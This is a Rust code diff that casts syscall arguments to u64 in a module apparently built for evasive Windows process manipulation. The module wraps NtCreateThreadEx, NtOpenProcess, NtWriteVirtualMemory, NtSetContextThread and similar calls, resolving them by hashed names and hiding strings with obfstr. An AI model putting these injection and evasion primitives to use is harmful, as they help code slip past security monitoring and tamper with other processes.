@@ -12,17 +12,17 @@ pub fn create_remote_thread_ex(process_handle: isize, start: usize, arg: usize) 
     let status = syscall!(
         nt_create_hash,
         NtCreateThreadExFn,
-        &mut thread_handle,
-        THREAD_ALL_ACCESS,
-        core::ptr::null_mut::<c_void>(),
-        process_handle,
-        start as *mut c_void,
-        arg as *mut c_void,
-        0u32,
-        0usize,
-        0usize,
-        0usize,
-        core::ptr::null_mut::<c_void>(),
+        (&mut thread_handle as *mut isize as u64),
+        THREAD_ALL_ACCESS as u64,
+        core::ptr::null_mut::<c_void>() as u64,
+        process_handle as u64,
+        (start as *mut c_void) as u64,
+        (arg as *mut c_void) as u64,
+        0u32 as u64,
+        0usize as u64,
+        0usize as u64,
+        0usize as u64,
+        core::ptr::null_mut::<c_void>() as u64,
     );
 
     match status {
@@ -45,12 +45,12 @@ pub fn create_thread_ex(start: usize, arg: usize) -> Result<isize, String> {
 
 pub fn wait_for_single_object(handle: isize) -> i32 {
     let nt_wait_hash = crate::dbj2_hash!(b"NtWaitForSingleObject");
-    syscall!(nt_wait_hash, NtWaitForSingleObjectFn, handle, 0u8, core::ptr::null_mut::<i64>()).unwrap_or(-1)
+    syscall!(nt_wait_hash, NtWaitForSingleObjectFn, handle as u64, 0u8 as u64, core::ptr::null_mut::<i64>() as u64).unwrap_or(-1)
 }
 
 pub fn close_handle(handle: isize) {
     let nt_close_hash = crate::dbj2_hash!(b"NtClose");
-    let _ = syscall!(nt_close_hash, NtCloseFn, handle);
+    let _ = syscall!(nt_close_hash, NtCloseFn, handle as u64);
 }
 
 pub fn queue_apc_thread(thread_handle: isize, routine: usize) -> Result<(), String> {
@@ -86,10 +86,10 @@ pub fn query_system_information(info_class: u32, buffer: *mut u8, size: u32, ret
     let status = syscall!(
         nt_query_sys_hash,
         NtQuerySystemInformationFn,
-        info_class,
-        buffer as *mut c_void,
-        size,
-        return_len
+        info_class as u64,
+        (buffer as *mut c_void) as u64,
+        size as u64,
+        return_len as u64
     ).ok_or_else(|| obfstr!("Failed to resolve NtQuerySystemInformation").to_string())?;
 
     Ok(status)
@@ -111,13 +111,13 @@ pub fn duplicate_object(
     let status = syscall!(
         nt_dup_hash,
         NtDuplicateObjectFn,
-        source_process_handle,
-        source_handle,
-        target_process_handle,
-        target_handle,
-        desired_access,
-        handle_attributes,
-        options
+        source_process_handle as u64,
+        source_handle as u64,
+        target_process_handle as u64,
+        target_handle as u64,
+        desired_access as u64,
+        handle_attributes as u64,
+        options as u64
     ).ok_or_else(|| obfstr!("Failed to resolve NtDuplicateObject").to_string())?;
 
     Ok(status)
@@ -137,11 +137,11 @@ pub fn query_object(
     let status = syscall!(
         nt_query_obj_hash,
         NtQueryObjectFn,
-        handle,
-        object_information_class,
-        object_information,
-        object_information_length,
-        return_length
+        handle as u64,
+        object_information_class as u64,
+        object_information as u64,
+        object_information_length as u64,
+        return_length as u64
     ).ok_or_else(|| obfstr!("Failed to resolve NtQueryObject").to_string())?;
 
     Ok(status)
@@ -161,11 +161,11 @@ pub fn set_io_completion(
     let status = syscall!(
         nt_set_io_hash,
         NtSetIoCompletionFn,
-        io_completion_handle,
-        key_context,
-        apc_context,
-        io_status,
-        io_status_information
+        io_completion_handle as u64,
+        key_context as u64,
+        apc_context as u64,
+        io_status as u64,
+        io_status_information as u64
     ).ok_or_else(|| obfstr!("Failed to resolve NtSetIoCompletion").to_string())?;
 
     Ok(status)
@@ -195,8 +195,8 @@ pub fn set_context_thread(thread_handle: isize, context: *const std::ffi::c_void
     let status = syscall!(
         nt_set_context_hash,
         NtSetContextThreadFn,
-        thread_handle,
-        context
+        thread_handle as u64,
+        context as u64
     ).ok_or_else(|| obfstr!("Failed to resolve NtSetContextThread").to_string())?;
 
     if status < 0 {
@@ -214,8 +214,8 @@ pub fn resume_thread(thread_handle: isize) -> Result<u32, String> {
     let status = syscall!(
         nt_resume_hash,
         NtResumeThreadFn,
-        thread_handle,
-        &mut suspend_count
+        thread_handle as u64,
+        (&mut suspend_count as *mut u32 as u64)
     ).ok_or_else(|| obfstr!("Failed to resolve NtResumeThread").to_string())?;
 
     if status < 0 {
@@ -247,10 +247,10 @@ pub fn open_process(pid: u32, access: u32) -> Result<isize, String> {
     let status = syscall!(
         nt_open_hash,
         NtOpenProcessFn,
-        &mut handle,
-        access,
-        &mut oa,
-        &mut client_id
+        (&mut handle as *mut isize as u64),
+        access as u64,
+        (&mut oa as *mut ObjectAttributes as u64),
+        (&mut client_id as *mut ClientId as u64)
     ).ok_or_else(|| obfstr!("Failed to resolve NtOpenProcess").to_string())?;
 
     if status < 0 {
@@ -270,11 +270,11 @@ pub fn read_virtual_memory(process_handle: isize, base_addr: usize, buffer: &mut
     let status = syscall!(
         nt_read_hash,
         NtReadVirtualMemoryFn,
-        process_handle,
-        base_addr as *mut c_void,
-        buffer.as_mut_ptr() as *mut c_void,
-        buffer.len(),
-        &mut bytes_read
+        process_handle as u64,
+        (base_addr as *mut c_void) as u64,
+        (buffer.as_mut_ptr() as *mut c_void) as u64,
+        buffer.len() as u64,
+        (&mut bytes_read as *mut usize as u64)
     ).ok_or_else(|| obfstr!("Failed to resolve NtReadVirtualMemory").to_string())?;
 
     if status < 0 {
@@ -294,11 +294,11 @@ pub fn write_virtual_memory(process_handle: isize, base_addr: usize, buffer: &[u
     let status = syscall!(
         nt_write_hash,
         NtWriteVirtualMemoryFn,
-        process_handle,
-        base_addr as *mut c_void,
-        buffer.as_ptr() as *mut c_void,
-        buffer.len(),
-        &mut bytes_written
+        process_handle as u64,
+        (base_addr as *mut c_void) as u64,
+        (buffer.as_ptr() as *mut c_void) as u64,
+        buffer.len() as u64,
+        (&mut bytes_written as *mut usize as u64)
     ).ok_or_else(|| obfstr!("Failed to resolve NtWriteVirtualMemory").to_string())?;
 
     if status < 0 {
@@ -317,8 +317,8 @@ pub fn delay_execution_seconds(seconds: i64) -> Result<(), String> {
     let dstatus = syscall!(
         nt_delay_hash,
         NtDelayExecutionFn,
-        1u8,
-        &mut interval as *mut i64
+        1u8 as u64,
+        (&mut interval as *mut i64 as u64)
     )
     .ok_or_else(|| obfstr!("Failed to resolve NtDelayExecution").to_string())?;
 
@@ -344,11 +344,11 @@ pub fn query_information_process(
     let status = syscall!(
         nt_query_hash,
         NtQueryInformationProcessFn,
-        process_handle,
-        process_information_class,
-        process_information,
-        process_information_length,
-        return_length
+        process_handle as u64,
+        process_information_class as u64,
+        process_information as u64,
+        process_information_length as u64,
+        return_length as u64
     ).ok_or_else(|| obfstr!("Failed to resolve NtQueryInformationProcess").to_string())?;
 
     Ok(status)
